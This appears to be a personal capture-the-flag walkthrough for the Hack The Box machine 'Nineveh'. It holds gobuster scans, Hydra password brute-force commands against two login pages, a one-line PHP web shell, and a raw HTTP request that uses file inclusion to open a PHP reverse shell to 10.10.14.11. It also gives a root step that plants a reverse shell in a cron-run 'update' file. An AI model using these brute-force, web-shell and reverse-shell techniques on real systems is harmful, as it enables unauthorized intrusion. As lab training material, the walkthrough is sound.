```zsh
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10
.10.43 -t 30 -k                                                                                                        
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.43
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/08 03:03:04 Starting gobuster
===============================================================
/db (Status: 301)
/server-status (Status: 403)
/secure_notes (Status: 301)
===============================================================
2020/06/08 03:29:40 Finished
===============================================================
```


```zsh

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.
10.43:80 -t 30                                              
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.43:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/06/08 03:33:05 Starting gobuster
===============================================================
/department (Status: 301)
/server-status (Status: 403)

```

Departmemnt Password CracK:

```zsh
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/
login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password"
```
> [80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t


phpLiteAdmin Login Password crack:

```zsh
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect Password."
```

ninevehNotes.php

<?php echo system($_GET["cmd"]); ?>

http://nineveh.htb/department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=ls

```
GET /department/manage.php?notes=/var/tmp/ninevehNotes.php&cmd=php+-r+'$sock%3dfsockopen("10.10.14.11",443)%3bexec("/bin/bash+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
Host: nineveh.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=fd5kehs3bci6tabbfs7oaj2q61
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

```

/report 

ssh into the machine using the key found while ```binwalk -e nineveh```

*PORT KNOCKING FROM IPPSEC watch*

pspy - chroot vuln > make a file called update and put a reverse shell in it. chmod +x update. Start a listner port at the number in update file. Enjoy root !


82a864f9eec2a76c166ec7b1078ca6c8

8a2b4956612b485720694fb45849ec3a